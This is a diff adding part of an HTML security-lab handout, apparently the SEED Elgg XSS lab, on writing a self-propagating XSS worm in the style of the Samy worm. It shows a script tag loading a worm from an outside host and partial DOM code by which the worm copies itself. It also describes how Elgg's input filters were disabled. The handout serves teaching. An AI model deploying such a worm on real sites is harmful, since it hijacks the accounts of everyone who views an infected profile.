+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</pre><p>Similar to Task 3, the above code should be placed in the <code>&quot;About Me&quot;</code> field of Samy&apos;s profile page, and the Text mode should be enabled before entering the above JavaScript code.</p>
+<h2 class="mume-header" id="task-5-writing-a-self-propagating-xss-worm">Task 5: Writing a Self-Propagating XSS Worm</h2>
+
+<p>To become a real worm, the malicious JavaScript program should be able to propagate itself. Namely, whenever some people view an infected profile, not only will their profiles be modified, the worm will also be propagated to their profiles, further affecting others who view these newly infected profiles. This way, the more people view the infected profiles, the faster the worm can propagate. This is exactly the same mechanism used by the Samy Worm: within just 20 hours of its October 4, 2005 release, over one million users were affected, making Samy one of the fastest spreading viruses of all time. The JavaScript code that can achieve this is called a <strong>self-propagating cross-site scripting worm</strong>. In this task, you need to implement such a worm, which not only modifies the victim&apos;s profile and adds the user &quot;Samy&quot; as a friend, but also add a copy of the worm itself to the victim&apos;s profile, so the victim is turned into an attacker.</p>
+<p>To achieve self-propagation, when the malicious JavaScript modifies the victim&apos;s profile, it should copy itself to the victim&apos;s profile. There are several approaches to achieve this, and we will discuss two common approaches.</p>
+<h3 class="mume-header" id="link-approach">Link Approach</h3>
+
+<p>If the worm is included using the <code>src</code> attribute in the <code>&lt;script&gt;</code> tag,<br>
+writing self-propagating worms is much easier. We have discussed the<br>
+<code>src</code> attribute in Task 1, and an example is given below. The worm can<br>
+simply copy the following <code>&lt;script&gt;</code> tag to the victim&apos;s profile,<br>
+essentially infecting the profile with the same worm.</p>
+<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
+    src<span class="token operator">=</span><span class="token string">&quot;http://www.example.com/xss_worm.js&quot;</span><span class="token operator">&gt;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</pre><h3 class="mume-header" id="dom-approach">DOM Approach</h3>
+
+<p>If the entire JavaScript program (i.e., the worm) is embedded in the infected profile, to propagate the worm to another profile, the worm code can use DOM APIs to retrieve a copy of itself from the web page. An example of using DOM APIs is given below. This code gets a copy of itself, and displays it in an alert window:</p>
+<pre data-role="codeBlock" data-info="html" class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>worm<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword keyword-var">var</span> headerTag <span class="token operator">=</span> <span class="token string">&quot;&lt;script type=\&quot;text/javascript\&quot; id=\&quot;worm\&quot;&gt;&quot;</span><span class="token punctuation">;</span>
+    <span class="token keyword keyword-var">var</span> jsCode <span class="token operator">=</span> <span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token method function property-access">getElementById</span><span class="token punctuation">(</span><span class="token string">&quot;worm&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token property-access">innerHTML</span><span class="token punctuation">;</span>
+    <span class="token keyword keyword-var">var</span> tailTag <span class="token operator">=</span> <span class="token string">&quot;&lt;/&quot;</span> <span class="token operator">+</span> <span class="token string">&quot;script&gt;&quot;</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// Put all the pieces together, and apply the URI encoding</span>
+    <span class="token keyword keyword-var">var</span> wormCode <span class="token operator">=</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>headerTag <span class="token operator">+</span> jsCode <span class="token operator">+</span> tailTag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token spread operator">...</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</pre><p>It should be noted that <code>innerHTML</code> only gives us the inside part of the code, not including the surrounding <code>script</code> tags. We just need to add the beginning tag <code>&lt;script id=&quot;worm&quot;&gt;</code> (line ) and the ending tag <code>&lt;/script&gt;</code> (line ) to form an identical copy of the malicious code.</p>
+<p>When data are sent in HTTP POST requests with the <code>Content-Type</code> set to <code>application/x-www- form-urlencoded</code>, which is the type used in our code, the data should also be encoded. The encoding scheme is called <em>URL encoding</em>, which replaces non-alphanumeric characters in the data with <code>%HH</code>, a percentage sign and two hexadecimal digits representing the ASCII code of the character. The <code>encodeURICom ponent()</code> function in line is used to URL-encode a string.</p>
+<h2 class="mume-header" id="elggs-countermeasures">Elgg&apos;s Countermeasures</h2>
+
+<p>This sub-section is only for information, and there is no specific task to do. It shows how Elgg defends against the XSS attack. Elgg does have built-in countermeasures, and we have disabled them to make the attack work. Actually, Elgg uses two countermeasures. One is a custom built security plugin <code>HTMLawed</code>, which validates the user input and removes the tags from the input. We have commented out the invocation of the plugin inside the <code>filter_tags()</code> function in <code>input.php</code>. See the following:</p>
+<pre data-role="codeBlock" data-info="js" class="language-javascript"><span class="token keyword keyword-function">function</span> <span class="token function">filter_tags</span><span class="token punctuation">(</span><span class="token parameter">$<span class="token keyword keyword-var">var</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment">// return elgg_trigger_plugin_hook(&apos;validate&apos;, &apos;input&apos;, null, $var);</span>
+    <span class="token keyword control-flow keyword-return">return</span> $<span class="token keyword keyword-var">var</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</pre><p>In addition to <code>HTMLawed</code>, Elgg also uses PHP&apos;s built-in method <code>htmlspecialchars()</code> to encode the special characters in user input, such as encoding <code>&quot;&lt;&quot;</code> to <code>&quot;&amp;lt&quot;</code>, <code>&quot;&gt;&quot;</code> to <code>&quot;&amp;gt&quot;</code>, etc. This method is invoked in <code>dropdown.php</code>, <code>text.php</code>, and <code>url.php</code> inside the folder. We have commented them out to turn off the countermeasure.</p>
+
+      </div>
+      
+      
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    </body></html>
